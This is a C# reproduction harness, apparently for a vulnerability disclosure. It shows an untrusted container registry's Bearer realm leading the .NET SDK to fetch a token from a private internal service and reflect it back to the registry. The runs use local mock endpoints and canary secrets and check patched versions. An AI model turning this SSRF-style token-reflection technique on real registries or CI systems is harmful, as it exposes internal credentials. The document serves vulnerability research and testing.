// Synthetic internal-response reflection through an untrusted OCI registry's Bearer realm.
// Demonstrates a possible read/exfil consequence only for HTTP services returning Docker-shaped
// JSON {"token": ...}; does not claim cloud-metadata access or general SSRF response disclosure.
// No external domains, real secrets, or privileged endpoints.
using System.Collections.Concurrent;
using System.Net;
using System.Reflection;
using System.Runtime.Loader;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging.Abstractions;

static class ResponseReflectionLab
{
    const string User="SYNTH_REFLECTION_PUBLISH_USER";
    const string Password="SYNTH_REFLECTION_PUBLISH_PASSWORD";
    const string Canary="SYNTH_INTERNAL_TOKEN_CANARY_PRIVATE_ONLY";
    static readonly string Sdk=Environment.GetEnvironmentVariable("SDK_VER")??"unknown";
    static readonly bool Is10=Sdk.StartsWith("10.",StringComparison.Ordinal);
    static readonly bool Patched=Sdk.StartsWith("12.",StringComparison.Ordinal);
    static readonly List<object> Results=[];
    static string Basic=>"Basic "+Convert.ToBase64String(Encoding.UTF8.GetBytes(User+":"+Password));
    static readonly string[] Scenarios={"direct-private-ip","dns-private-alias","redirect307-to-private","header-guard-dns"};

    static object NewApi(Assembly asm,string authority)
    {
        var type=asm.GetType("Microsoft.NET.Build.Containers.DefaultRegistryAPI",true)!;
        var mode=Enum.Parse(asm.GetType("Microsoft.NET.Build.Containers.RegistryMode",true)!,"Push");
        return Activator.CreateInstance(type,BindingFlags.Instance|BindingFlags.NonPublic|BindingFlags.Public,
            null,[authority,new Uri("https://"+authority+"/"),false,NullLogger.Instance,mode],null)!;
    }

    static async Task<bool> ReadProtectedManifest(Assembly asm,string authority)
    {
        try
        {
            var api=NewApi(asm,authority);
            object ops=api.GetType().GetProperty("Manifest")!.GetValue(api)!;
            if(Is10)
            {
                var m=ops.GetType().GetMethod("GetAsync")!;
                using var response=await (Task<HttpResponseMessage>)m.Invoke(ops,["private/release","latest",CancellationToken.None])!;
                return response.IsSuccessStatusCode;
            }
            else
            {
                var m=ops.GetType().GetMethod("ExistsAsync")!;
                return await (Task<bool>)m.Invoke(ops,["private/release","latest",CancellationToken.None])!;
            }
        }
        catch{return false;}
    }

    public static async Task RunAsync()
    {
        string[] keys={"DOTNET_CONTAINER_PUSH_REGISTRY_UNAME","DOTNET_CONTAINER_PUSH_REGISTRY_PWORD",
            "DOTNET_CONTAINER_REGISTRY_UNAME","DOTNET_CONTAINER_REGISTRY_PWORD",
            "DOTNET_CONTAINER_AUTH_REALM_POLICY","DOTNET_CONTAINER_AUTH_REALM_ALLOWED_ADDRESSES"};
        var restore=keys.ToDictionary(x=>x,x=>Environment.GetEnvironmentVariable(x));
        IWebProxy proxy=HttpClient.DefaultProxy;
        HttpClient.DefaultProxy=new WebProxy();
        Environment.SetEnvironmentVariable(keys[0],User);
        Environment.SetEnvironmentVariable(keys[1],Password);
        Environment.SetEnvironmentVariable(keys[2],null);
        Environment.SetEnvironmentVariable(keys[3],null);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_AUTH_REALM_POLICY","Public");
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_AUTH_REALM_ALLOWED_ADDRESSES",
            Patched?"127.0.0.1":null);
        bool all=true;
        try
        {
            string dll=Environment.GetEnvironmentVariable("DOTNET_SDK_CONTAINER_ASSEMBLY")!;
            var asm=AssemblyLoadContext.Default.LoadFromAssemblyPath(Path.GetFullPath(dll));
            foreach(string mode in Scenarios)
                all&=await Test(asm,mode);
        }
        finally
        {
            HttpClient.DefaultProxy=proxy;
            foreach(var kv in restore)Environment.SetEnvironmentVariable(kv.Key,kv.Value);
            Directory.CreateDirectory("REPRODUCTION-EVIDENCE");
            File.WriteAllText("REPRODUCTION-EVIDENCE/sdk-"+Sdk+"-private-response-reflection.json",
                JsonSerializer.Serialize(new{sdk=Sdk,tests=Results},new JsonSerializerOptions{WriteIndented=true}));
        }
        if(!all)throw new Exception("Synthetic internal response reflection assertions failed");
    }

    static async Task<bool> Test(Assembly asm,string mode)
    {
        bool direct=mode=="direct-private-ip";
        bool redirect=mode=="redirect307-to-private";
        bool guard=mode=="header-guard-dns";
        int internalVisits=0;
        int privateCanaryIssued=0;
        int privateReceivedPassword=0;
        int protectedRegistryRequests=0;
        int untrustedRegistrySawInternalCanary=0;
        var traffic=new ConcurrentQueue<object>();
        string? redirectDestination=null;
        await using var privateService=await LocalEndpoint.Start("127.0.0.2",async ctx=>{
            Interlocked.Increment(ref internalVisits);
            string body=await new StreamReader(ctx.Request.Body).ReadToEndAsync();
            bool hasPublishBasic=ctx.Request.Headers.Authorization.ToString()==Basic;
            bool hasPublishForm=body.Contains(Password,StringComparison.Ordinal);
            if(hasPublishBasic||hasPublishForm)Interlocked.Increment(ref privateReceivedPassword);
            bool hasMetadataHeader=ctx.Request.Headers.TryGetValue("Metadata-Flavor",out var meta)
                && meta.ToString()=="Google";
            traffic.Enqueue(new{at="private-internal-service",method=ctx.Request.Method,
                basic=hasPublishBasic,oauthPassword=hasPublishForm,metadataHeader=hasMetadataHeader});
            if(guard && !hasMetadataHeader)
            {
                ctx.Response.StatusCode=403;
                return;
            }
            Interlocked.Increment(ref privateCanaryIssued);
            ctx.Response.StatusCode=200;ctx.Response.ContentType="application/json";
            await ctx.Response.WriteAsync(JsonSerializer.Serialize(new{token=Canary,expires_in=180}));
        },tls:true);
        redirectDestination="https://privateauth.lab.test:"+privateService.Port+"/internal/auth";
        await using var publicToken=await LocalEndpoint.Start("127.0.0.1",async ctx=>{
            string body=await new StreamReader(ctx.Request.Body).ReadToEndAsync();
            traffic.Enqueue(new{at="public-redirect",method=ctx.Request.Method,
                hasPublisherBasic=ctx.Request.Headers.Authorization.ToString()==Basic,
                oauthPassword=body.Contains(Password,StringComparison.Ordinal)});
            if(ctx.Request.Method=="GET")ctx.Response.StatusCode=405;
            else
            {
                ctx.Response.StatusCode=307;
                ctx.Response.Headers.Location=redirectDestination;
            }
        },tls:true);
        string realm=direct?"https://127.0.0.2:"+privateService.Port+"/internal/auth":
            redirect?"https://publicauth.lab.test:"+publicToken.Port+"/oauth":
            redirectDestination;
        await using var registry=await LocalEndpoint.Start("127.0.0.1",async ctx=>{
            Interlocked.Increment(ref protectedRegistryRequests);
            bool gotInternalCanary=ctx.Request.Headers.Authorization.ToString()=="Bearer "+Canary;
            if(gotInternalCanary)Interlocked.Increment(ref untrustedRegistrySawInternalCanary);
            traffic.Enqueue(new{at="untrusted-registry",method=ctx.Request.Method,
                receivedInternalCanaryAsBearer=gotInternalCanary});
            if(gotInternalCanary)
            {
                ctx.Response.StatusCode=200;
                ctx.Response.ContentType="application/vnd.oci.image.manifest.v1+json";
                await ctx.Response.WriteAsync("{}");
            }
            else
            {
                ctx.Response.StatusCode=401;
                ctx.Response.Headers.WWWAuthenticate="Bearer realm=\""+realm+"\",service=\"untrusted-registry\"";
            }
        },tls:true);
        bool read=await ReadProtectedManifest(asm,"registry.lab.test:"+registry.Port);
        bool shouldReflect=!guard&&!Patched&&(!direct||Is10);
        bool reflected=untrustedRegistrySawInternalCanary>0;
        bool pass=protectedRegistryRequests>0 &&
            (shouldReflect
                ? read && reflected && internalVisits>0 && privateCanaryIssued>0
                : !read && !reflected && privateCanaryIssued==0) &&
            (!Patched || internalVisits==0) &&
            (!guard || privateCanaryIssued==0);
        var result=new{scenario=mode,sdk=Sdk,passed=pass,patched=Patched,
            mockRegistryManifestReadAuthorizedWithInternalToken=read,
            syntheticInternalServiceRequests=internalVisits,
            syntheticInternalCanaryResponses=privateCanaryIssued,
            sourcePublisherCredentialsObservedByInternalService=privateReceivedPassword,
            untrustedRegistryReceivedInternalCanaryAsBearer=reflected,
            untrustedRegistryCanaryBearerRequestCount=untrustedRegistrySawInternalCanary,
            demonstrates="Conditional reflection of a Docker-shaped JSON token response, not general-purpose HTTP response extraction",
            traffic=traffic.ToArray()};
        Results.Add(result);
        Console.WriteLine("[REFLECTION "+Sdk+"] "+mode+" "+JsonSerializer.Serialize(result));
        return pass;
    }
}
